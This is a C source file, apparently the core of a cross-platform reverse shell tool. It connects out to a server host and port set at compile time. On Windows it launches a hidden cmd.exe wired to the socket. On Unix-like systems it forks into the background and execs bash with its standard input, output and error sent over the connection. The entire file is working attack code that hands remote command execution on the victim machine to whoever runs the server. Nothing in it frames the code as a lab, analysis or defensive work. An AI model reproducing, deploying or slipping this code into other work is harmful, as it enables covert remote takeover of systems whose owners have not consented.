#include "reverse_shell.h"

int	connect_client(SOCKET *client_fd)
{
	struct sockaddr_in	addr_server;

	*client_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (!ISVALIDSOCKET(*client_fd))
		return (1);
	addr_server.sin_family = AF_INET;
	addr_server.sin_port = htons(PORT);
	if (inet_pton(AF_INET, SERVER_HOST, &addr_server.sin_addr.s_addr) <= 0)
	{
		CLOSESOCKET(*client_fd);
		return (1);
	}
	if (connect(*client_fd, (struct sockaddr *)&addr_server, sizeof(addr_server)) < 0)
	{
		CLOSESOCKET(*client_fd);
		return (1);
	}
	return (0);
}

int	main(int argc, char **argv, char **envp)
{
	SOCKET	fd;

	#if defined(_WIN32)
		WSADATA d;
		if (WSAStartup(MAKEWORD(2, 2), &d))
			return (1);

		if (connect_client(&fd) != 0)
			return (0);

		// Make socket handle inheritable
		HANDLE h = (HANDLE)fd;
		SetHandleInformation(h, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

		STARTUPINFOA sinfo;
		ZeroMemory(&sinfo, sizeof(sinfo));
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESTDHANDLES;
		sinfo.hStdInput  = h;
		sinfo.hStdOutput = h;
		sinfo.hStdError  = h;

		PROCESS_INFORMATION pinfo;
		ZeroMemory(&pinfo, sizeof(pinfo));

		if (!CreateProcessA(
				NULL,
				"cmd.exe",
				NULL,
				NULL,
				TRUE,                // inherit handles
				CREATE_NO_WINDOW,
				NULL,
				NULL,
				&sinfo,
				&pinfo))
		{
			WSACleanup();
			return (1);
		}

		CloseHandle(pinfo.hThread);
		CloseHandle(pinfo.hProcess);

		WSACleanup();
		return (0);
	#else
		(void) argc;
		(void) argv;
		if (fork() != 0)
			return (0);
		if (connect_client(&fd) != 0)
			return (0);
		char *args[] = {"/bin/sh", NULL};
		dup2(fd, 0);
		dup2(fd, 1);
		dup2(fd, 2);
		execve("/bin/bash", args, envp);
	#endif
}
